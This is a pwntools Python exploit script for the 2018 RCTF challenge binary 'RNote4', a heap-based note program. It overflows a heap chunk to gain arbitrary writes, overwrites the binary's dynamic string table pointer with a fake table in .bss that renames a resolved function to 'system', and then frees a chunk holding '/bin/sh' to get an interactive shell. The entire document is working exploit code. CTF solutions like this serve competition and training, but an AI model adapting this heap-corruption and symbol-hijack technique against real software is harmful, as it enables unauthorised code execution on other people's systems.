from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./2018_RCTF_RNote4")
else:
	pass

def add(size,content):
	p.send("\x01")
	p.send(chr(size))
	p.send(content)

def edit(index,size,content):
	p.send("\x02")
	p.send(chr(index))
	p.send(chr(size))
	p.send(content)

def free(index):
	p.send("\x03")
	p.send(chr(index))

def change(addr,content):
	payload = "a" * 0x18 + p64(0x21) + p64(0x10) + p64(addr)
	edit(0,len(payload),payload)
	edit(1,len(content),content)

def debugf():
	gdb.attach(p,"b *0x400B72\nb *0x400B51")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
bss_addr = 0x603000
add(0x10,"a"*0x10)
add(0x10,"b"*0x10)
add(0x8,"/bin/sh\x00")
change(0x601EA8 + 8,p64(bss_addr))
change(bss_addr,"a"*0x5f + "system")
free(2)
p.interactive()
